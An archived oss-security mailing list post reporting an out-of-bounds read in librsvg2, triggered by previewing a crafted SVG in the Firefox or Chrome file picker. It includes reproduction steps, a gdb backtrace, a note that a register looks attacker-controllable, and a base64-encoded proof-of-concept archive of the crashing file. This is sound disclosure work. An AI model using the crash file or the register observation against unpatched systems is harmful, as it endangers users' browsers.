X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5737" "Monday" "4" "July" "2016" "21:13:05" "+0200" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdSFtHbu1d45rK4Hi8=Z+KirfOZ+g=gBT5LsCWcxgfnz-w@mail.gmail.com>" "129" "[oss-security] Browsing and attaching images considered harmful in Linux" "^Date:" nil nil "7" "2016070419:13:05" "[oss-security] Browsing and attaching images considered harmful in Linux" (number mark "        gustavo.grie Jul  4  129/5737  " thread-indent "\"[oss-security] Browsing and attaching images considered harmful in Linux\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 1914 invoked by uid 550); 4 Jul 2016 19:13:26 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 1856 invoked from network); 4 Jul 2016 19:13:18 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=fD/iEu2I6Qv/gTsTTqgWksnKZJtAAKjgQkNYSrSi628=;
        b=nwohWL7hI/orD9X0M2d8xvwr2gV/LX9VMIqNbWaItJ1TV8R/8+u4EZEYbtuJ0Y/rVD
         OhBK/lNTN4ASnehU9w9HpFGN/G6AG6F2yC/Jlc4P3gbEdO9BPu7GEQpeWC3Mh8Y8gbpH
         JeC4YujZuhus4YkGr7MVIMAuxzVqSl4p3uSU4DHs1qeAXAjSfheNLcjMcZEz6Q35AxYF
         Xnyg0ehUKpXrUYsVbv4f0m2KzlMYgcRS7K1Z+a74rnf7i1A5cK5P90NBu6XnnAS4SeuA
         H9aSsRsAUxsgOUH9HllWgawidh870cicFCIJp+qQpeOiwy3bxcZwxLikk9P+TbKLEb0l
         JL7w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=fD/iEu2I6Qv/gTsTTqgWksnKZJtAAKjgQkNYSrSi628=;
        b=jBVcoIOEkBiq7jBLx6kbPoe4Efs3wWky9yzOFkCCg/O49vy4ggH80dsgIlLAe39jT4
         +pyvNz+TdKV3Pe170oEY1PlNNOGBqj6f1UpFa+hos687sRab0oLOUUp/d7tpPkwGiBqF
         m48gjHkUSy5hQ6vBx31z6UW+4SBLZPNJQ4xzlKndFHqi7CVmVPT5WxSkCsTcn2h9oeRh
         JRetkSZIIjG2H44FbNqscfZEABFWi2DCSpBaHI2sNsTNshKelPLSuJ6XfENvtT7jPVAa
         xM1al4h4/iCnHLSmsvDWQT+CumabRlnl6wEgsvYNO1/be3kG3atzJvThoHBZsCozU7pB
         hTGA==
X-Gm-Message-State: ALyK8tJc0LlY8Z8hxzPWv+k93giIxm/MGEPBofgwK/Dm2oUp/QLkKFTHIGC2Pzy6i3n4JjoIrtbQPavuOJgshg==
X-Received: by 10.107.137.95 with SMTP id l92mr10359425iod.177.1467659586018;
 Mon, 04 Jul 2016 12:13:06 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CACn5sdSFtHbu1d45rK4Hi8=Z+KirfOZ+g=gBT5LsCWcxgfnz-w@mail.gmail.com>
Content-Type: multipart/mixed; boundary=001a113ecbfe47421c0536d42091
Date: Mon, 4 Jul 2016 21:13:05 +0200
From: Gustavo Grieco <gustavo.grieco@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Browsing and attaching images considered harmful in Linux
To: oss-security@lists.openwall.com

--001a113ecbfe47421c0536d42091
Content-Type: text/plain; charset=UTF-8

Hi,

I would like to bring the attention of the oss-security list to the
existence of many security issues in the gdk-pixbuf library and its
dependencies causing a that attaching a corrupted image file in Linux
has become a risky business. For instance,  there is a read
out-of-bounds in librsvg2 (a dependency of gdk-pixbuf used to render
svg images), which can be easily triggered if you try to attach a svg
in Firefox. I tested it in Ubuntu 14.04 (x86_64) using the
corresponding version of librsvg2 (2.40.2-1 with debug symbols) and
Firefox. To reproduce:

1. Download and unpack boom.tar.gz somewhere.
2. gdb --args /usr/lib/firefox/firefox
3. Execute "run" and try to attach (ctrl+o) the svg file inside boom
directory in Firefox.

Result:

Program received signal SIGSEGV, Segmentation fault.
0x00007fffbb7a4c0d in rsvg_pattern_fix_fallback
(pattern=pattern@entry=0x7ffffffea110) at rsvg-paint-server.c:645
645        rsvg-paint-server.c: No such file or directory.
(gdb) bt
#0  0x00007fffbb7a4c0d in rsvg_pattern_fix_fallback
(pattern=pattern@entry=0x7ffffffea110) at rsvg-paint-server.c:645
#1  0x00007fffbb7c0650 in _set_source_rsvg_pattern
(ctx=0x7fffc1672b00, rsvg_pattern=0x7ffffffea110, opacity=<optimized
out>, bbox=...)
    at rsvg-cairo-draw.c:195
#2  0x00007fffbb7c1e4d in rsvg_cairo_render_path (ctx=0x7fffc1672b00,
path=<optimized out>) at rsvg-cairo-draw.c:526
#3  0x00007fffbb7bea12 in rsvg_render_path
(ctx=ctx@entry=0x7fffc1672b00, path=path@entry=0x7fffc4708640) at
rsvg-base.c:1976
#4  0x00007fffbb7b59c8 in _rsvg_node_rect_draw (self=0x7fffc45c6f50,
ctx=0x7fffc1672b00, dominate=0) at rsvg-shapes.c:479
#5  0x00007fffbb7b6503 in rsvg_node_draw (self=0x7fffc45c6f50,
ctx=0x7fffc1672b00, dominate=<optimized out>) at rsvg-structure.c:69
#6  0x00007fffbb7b6583 in _rsvg_node_draw_children
(self=0x7fffc8058560, ctx=0x7fffc1672b00, dominate=0) at
rsvg-structure.c:87
#7  0x00007fffbb7b6503 in rsvg_node_draw (self=0x7fffc8058560,
ctx=0x7fffc1672b00, dominate=<optimized out>) at rsvg-structure.c:69
#8  0x00007fffbb7b6903 in rsvg_node_svg_draw (self=0x7fffc4915080,
ctx=0x7fffc1672b00, dominate=<optimized out>) at rsvg-structure.c:323
#9  0x00007fffbb7b6503 in rsvg_node_draw (self=0x7fffc4915080,
ctx=0x7fffc1672b00, dominate=<optimized out>) at rsvg-structure.c:69
#10 0x00007fffbb7c2ac3 in rsvg_handle_render_cairo_sub
(handle=handle@entry=0x7fffc8cd3440, cr=cr@entry=0x7fffd7d58000,
id=id@entry=0x0)
    at rsvg-cairo-render.c:225
#11 0x00007fffbb7c2ef4 in rsvg_handle_get_pixbuf_sub
(handle=0x7fffc8cd3440, id=id@entry=0x0) at rsvg.c:90
#12 0x00007fffbb7c2f77 in rsvg_handle_get_pixbuf (handle=<optimized
out>) at rsvg.c:119
#13 0x00007fffbb9cee46 in gdk_pixbuf__svg_image_stop_load
(data=0x7fffc50e18e0, error=0x7ffffffea6b8) at io-svg.c:160
#14 0x00007ffff35d31fb in gdk_pixbuf_loader_close
(loader=loader@entry=0x7fffc4424ea0, error=error@entry=0x0) at
gdk-pixbuf-loader.c:821
#15 0x00007ffff35d0e2a in gdk_pixbuf_new_from_file_at_scale
(filename=0x7fffc4577100
"/home/g/Work/Code/ef/gdk-pixbuf/svg/overflow-real-reap.svg",
    width=<optimized out>, height=<optimized out>,
preserve_aspect_ratio=<optimized out>, error=0x0) at
gdk-pixbuf-io.c:1372
#16 0x00007fffeafc7d19 in UpdateFilePreviewWidget
(file_chooser=0x7fffd9d53a30, preview_widget_voidptr=<optimized out>)
    at /build/firefox-mh9_e1/firefox-46.0.1+build1/widget/gtk/nsFilePicker.cpp:115
#17 0x00007ffff25273b8 in g_closure_invoke () from
/usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0
#18 0x00007ffff2538d3d in ?? () from
/usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0
...

It is interesting to note that rcx looks controllable:

(gdb) x/i $rip
=> 0x7fffbb7a4c0d <rsvg_pattern_fix_fallback+333>:        testb  $0x4,0xe4(%rcx)
(gdb) info registers
...
rcx            0xe5e5e5e5e5e5e5e5        -1880844493789993499
...

Fortunately, this issue is already solved in the last revision of
librsvg2 (AFAIK, this issue has no CVE, so please MITRE assign one if
suitable). Nevertheless, I reported such vulnerability to Mozilla more
than a month ago hoping that they will disable the svg support in the
open/attach widget. After some discussion, it was marked as WONTFIX.
While i understand why, i still feel it can be productive to discuss
this here.

(the same trick can be used to crash Chrome/Chromium, since the code
to open/attach an image is almost the same, so this is not a Firefox
specific issue)


Regards,
Gustavo

--001a113ecbfe47421c0536d42091
Content-Type: application/x-gzip; name="boom.tar.gz"
Content-Disposition: attachment; filename="boom.tar.gz"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_iq8ec04u0

H4sIAFvpRVcAA+1V30/bMBDmmb/iZjppe0jjNElTVU2lDQSPm1rgPSRua+Em
ke3Ssr9+F8dpk8LgBR4mOLXxz7v77ruzfVcUa7d4YHIhiq0jWSKqT9lXD8uT
txJK6XAYALZeFNJ2a8THP3iDaOD5wyCgEVAviIb+CdA3Q/CCbJROJEJ5LdzX
1utYYN/+JzLBRAPPYoKtJrDlmV7FxKP0K4EV48uVbkYPnG1/FruYUKAQjCj4
ZHoKMPniOLERx9mPAeUtx2372Xh+e3XNlD5PFAM1RuwrrRG7iklv1kNQuEXj
+gVTqeSl5kUOu2qTqgGX1Rdbt7TDfb/qPNE19oqSyUQXcm5mYbcWuTJ+RWNz
tslZ1jeGKiNdBWOjTJQ6l1wzyRMw2mvRQtTB0N5bL3bCNlOaa8FM7irEgpFp
b3Y+cc10zRRbKGtyUeTaWSQpw4Htr7l4jAnBdRaTm8sayX6fo2Ta6MJOcMkW
Men33ZRz4taIntt7mLSoLYTJ0gJlOWaqg2B+u7Aziv9BKN6IWGMt/GWikQth
jPw2/dwjUM/mNznXyOdGMTkv0fWv/Eaxdi13Svmokr3qR8DtOMrbjgakIiC/
H68MCWcH/6j0nIL/vMKgiSvlMsXMpYggJJA+mkbGBB0tuBAxWUrkibj7Oq31
pw2fXQvUmqC1DdoYkSw7hCVZqu38RopvDST/+ws02TQvbf66SePdpPlVcBPN
dtoQIRnqKy2Le1zLixyzAdb9nUjSezLlCo/WGLy+Dz2sWVRsezNw64Ih1dlF
rh/N14INotEBrB+OmphrV43jM7yIbbHiJQKpvUDqUsxkQtrkvObliNjGRx2O
HToNl/vcGUaOyv3KMretLM/QRCGyDpmVK4BK1UnydFVgWtc8y/CEG3yjY3e0
Hz4BVEPdrvAKIdOL2Y/L6yOWJy7e+NPTu+r9f+c3BtMQReE/33/69P2nYUBP
IHxnXEY++Pv/KZ/yKR9X/gKBPFQyAA4AAA==

--001a113ecbfe47421c0536d42091--
